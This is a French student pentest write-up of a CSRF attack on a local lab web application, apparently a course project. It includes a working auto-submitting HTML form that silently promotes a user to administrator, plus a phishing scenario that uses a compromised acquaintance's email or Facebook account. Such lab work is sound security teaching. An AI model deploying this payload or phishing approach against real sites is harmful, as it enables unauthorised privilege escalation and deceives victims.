## CSRF

Cet exemple illustre une attaque csrf sur le site web sti.

## Introduction

### Cible

L'attaque consiste à modifier le rôle d'un utilisateur pour le rendre administrateur.

### Condition 

Les conditions pour mener l'attaque à bien sont les suivantes

- L'attaquant connait les champs du formulaire permettant d'effectuer la requête POST
- L'attaquant a réussi à convaincre l'utilisateur de visiter son site web malveillant où se trouve sa page effectuant une requête POST.

Faiblesse de l'exemple :

- L'utilisateur sait que le rôle a été modifié car un message de confirmation s'affiche

### Démonstration

### Mise en place de l'infrastructure

L'attaquant possède un site web avec une page html contenant :

- Le formulaire a envoyer pour modifier le rôle de l'utilisateur
- Un code javascript effectuant directement la requête sans que l'utilisateur n'ait à le faire soi-même

### Page role.html

```html
<!DOCTYPE HTML>
<html>
    <head></head>
    <body>
    <form class='form' name="roleForme" method='POST' action="http://localhost:8080/index.php?action=vue_role&qIdUser=2" enctype="multipart/form-data">
  <!--
// vue_select_role.php
// Date de création : 07/10/2021
// Fonction : vue contenant les balises select pour changer le role d'un utilisateur
// __________________________________________
  -->
  <select  name="role">
      <option value="1"selected>Administrateur</option>
      <option value="2">Collaborateur </option>
    </select>
       <button type="submit" class="btn btn-primary" name="addRole">Envoyer</button>
    </form>
    <script language="javascript">document.roleForme.submit();</script>
</body>
</html>

```

Le code ci-dessus va automatiquement émettre une requête POST avec le contenu du formulaire dès que l'utilisateur est sur la page.

```javascript
<script language="javascript">document.roleForme.submit();</script>
```



### Scénario social engineering

Cette exemple illustre une façon possible pour convaincre l'utilisateur de cliquer sur le lien.

Il envoie le lien url de son site web et fait en sorte que l'utilisateur clique dessus. Par exemple, il a réussi à obtenir le compte email, facebook d'une connaissance de la victime. Il envoi l'email suivant :

![csrf-email](C:\Users\super\switchdrive2\HEIG\s5\sti\pentesting-sti\csrf\csrf-email.PNG)

L'utilisateur ne se méfie pas et clique sur lien url qui l'envoie sur le site malveillant contenant la page html (formulaire + script javasript)



### Résultat :

Une fois sur la page, le formulaire sera directement envoyé et l'action exécutée

Le rôle a bien été modifié !

![csrf-result](C:\Users\super\switchdrive2\HEIG\s5\sti\pentesting-sti\csrf\csrf-result.PNG)

Lorsqu'on se connecte en tant qu'user, on constate bien que la partie administration est dorénavant accessible![csrf-result2](C:\Users\super\switchdrive2\HEIG\s5\sti\pentesting-sti\csrf\csrf-result2.PNG)



Sources 

- https://portswigger.net/web-security/csrf

